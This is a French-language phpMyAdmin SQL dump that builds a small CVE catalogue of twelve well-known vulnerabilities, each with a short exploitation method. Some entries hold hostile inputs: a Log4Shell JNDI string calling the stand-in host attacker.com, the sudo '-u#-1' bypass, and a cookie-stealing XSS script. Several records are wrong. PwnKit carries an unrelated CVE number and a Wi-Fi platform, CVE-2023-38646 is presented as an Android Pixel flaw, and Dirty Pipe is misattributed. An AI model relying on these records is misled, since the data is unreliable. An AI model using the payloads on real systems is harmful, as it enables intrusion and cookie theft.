-- phpMyAdmin SQL Dump
-- version 5.2.1
-- https://www.phpmyadmin.net/
--
-- Hôte : 127.0.0.1
-- Généré le : mer. 30 juil. 2025 à 23:28
-- Version du serveur : 10.4.32-MariaDB
-- Version de PHP : 8.2.12

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
START TRANSACTION;
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Base de données : `cve_db`
--
CREATE DATABASE IF NOT EXISTS `cve_db` DEFAULT CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci;
USE `cve_db`;

-- --------------------------------------------------------

--
-- Structure de la table `vulnerabilities`
--

DROP TABLE IF EXISTS `vulnerabilities`;
CREATE TABLE `vulnerabilities` (
  `id` int(11) NOT NULL,
  `cve_id` varchar(20) NOT NULL,
  `cwe_id` varchar(20) DEFAULT NULL,
  `title` varchar(255) NOT NULL,
  `description` text DEFAULT NULL,
  `exploit_method` text DEFAULT NULL,
  `type` enum('dos','xss','rce','lfi','csrf','other') DEFAULT 'other',
  `platform` enum('windows','linux','android','ios','web','wifi') NOT NULL,
  `author` varchar(100) DEFAULT NULL,
  `date` date DEFAULT NULL,
  `verified` tinyint(1) DEFAULT 0,
  `has_app` tinyint(1) DEFAULT 0,
  `severity` enum('low','medium','high','critical') DEFAULT NULL,
  `created_at` timestamp NOT NULL DEFAULT current_timestamp()
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- Déchargement des données de la table `vulnerabilities`
--

INSERT INTO `vulnerabilities` (`id`, `cve_id`, `cwe_id`, `title`, `description`, `exploit_method`, `type`, `platform`, `author`, `date`, `verified`, `has_app`, `severity`, `created_at`) VALUES
(1, 'CVE-2021-34527', 'CWE-787', 'Windows PrintNightmare', 'Vulnérabilité de type RCE dans le spooler d\'impression Windows.', 'Utilisation de l\'outil Impacket ou scripts Python pour exécuter du code à distance.', 'rce', 'windows', 'John Doe', '2021-06-08', 1, 0, 'critical', '2025-07-30 20:39:45'),
(2, 'CVE-2023-38646', 'CWE-284', 'Android Pixel Privilege Escalation', 'Élévation de privilèges sur certains appareils Pixel.', 'Exploitation via un service système mal configuré.', '', 'android', 'Jane Smith', '2023-07-15', 1, 1, 'high', '2025-07-30 20:39:45'),
(3, 'CVE-2022-30190', 'CWE-78', 'MSDT Follina', 'Exécution de code via un document Word malveillant.', 'Envoi d’un DOCX contenant un lien vers un script PowerShell distant.', 'rce', 'windows', 'Alex Johnson', '2022-06-14', 1, 0, 'high', '2025-07-30 20:39:45'),
(4, 'CVE-2021-44228', 'CWE-117', 'Log4Shell', 'RCE dans Log4j via le logging de chaînes malveillantes.', 'Envoi d’une requête contenant ${jndi:ldap://attacker.com/exp}', 'rce', 'web', 'Anonymous', '2021-12-09', 1, 1, 'critical', '2025-07-30 20:39:45'),
(5, 'CVE-2022-0847', 'CWE-276', 'Dirty Pipe (Linux Kernel)', 'Privilège d\'élévation via une faille dans le mécanisme de pipe du noyau Linux.', 'Injection de données dans des fichiers en lecture seule (ex: /etc/passwd) via un exploit C.', 'other', 'linux', 'Max Kamper', '2022-03-07', 1, 1, 'high', '2025-07-30 21:12:52'),
(6, 'CVE-2019-14287', 'CWE-269', 'Sudo Bypass (Linux)', 'Élévation de privilèges via une mauvaise gestion de l\'UID dans sudo.', 'Exécuter sudo -u#-1 command pour contourner les restrictions.', '', 'linux', 'Apple Security', '2019-10-12', 1, 0, 'high', '2025-07-30 21:12:52'),
(7, 'CVE-2023-2713', 'CWE-79', 'Stored XSS dans Content Management System', 'Injection de scripts malveillants via un champ de commentaire non filtré.', 'Injecter <script>alert(document.cookie)</script> dans un commentaire pour voler des cookies.', 'xss', 'web', 'Alice Johnson', '2023-01-15', 1, 1, 'medium', '2025-07-30 21:12:52'),
(8, 'CVE-2021-26855', 'CWE-74', 'ProxyLogon (Exchange Server)', 'RCE dans Microsoft Exchange via un enchaînement de vulnérabilités.', 'Authentification aveugle + SSRF + LFI pour exécuter du code à distance.', 'rce', 'web', 'Orange Tsai', '2021-03-02', 1, 1, 'critical', '2025-07-30 21:12:52'),
(9, 'CVE-2021-30860', 'CWE-416', 'Kernel Use-After-Free (iOS)', 'Exécution de code arbitraire via une corruption mémoire dans le noyau iOS.', 'Exploitation via une application malveillante ou un site web (jailbreak).', 'rce', 'ios', 'Ian Beer', '2021-08-18', 1, 1, 'critical', '2025-07-30 21:12:52'),
(10, 'CVE-2023-23514', 'CWE-20', 'Safari WebKit XSS', 'Exécution de code JavaScript via une faille dans le moteur WebKit.', 'Forcer l\'ouverture d\'une page malveillante dans Safari pour exécuter du code.', 'xss', 'ios', 'Google Project Zero', '2023-02-14', 1, 0, 'high', '2025-07-30 21:12:52'),
(11, 'CVE-2017-13077', 'CWE-312', 'KRACK Attack (WPA2)', 'Attaque par réinstallation de clé dans le protocole WPA2.', 'Forcer le client à réutiliser un nonce d\'initialisation, permettant le déchiffrement du trafic.', 'dos', 'wifi', 'Mathy Vanhoef', '2017-10-16', 1, 1, 'high', '2025-07-30 21:12:52'),
(12, 'CVE-2020-12695', 'CWE-284', 'PwnKit (Linux polkit)', 'Élévation de privilèges via une mauvaise configuration dans polkit (souvent exploitable via réseau local/Wi-Fi).', 'Exécuter un exploit local pour obtenir root depuis un utilisateur non privilégié.', '', 'wifi', 'Qualys Research', '2021-01-26', 1, 1, 'critical', '2025-07-30 21:12:52');

--
-- Index pour les tables déchargées
--

--
-- Index pour la table `vulnerabilities`
--
ALTER TABLE `vulnerabilities`
  ADD PRIMARY KEY (`id`);

--
-- AUTO_INCREMENT pour les tables déchargées
--

--
-- AUTO_INCREMENT pour la table `vulnerabilities`
--
ALTER TABLE `vulnerabilities`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=13;


--
-- Métadonnées
--
USE `phpmyadmin`;

--
-- Métadonnées pour la table vulnerabilities
--

--
-- Métadonnées pour la base de données cve_db
--
COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
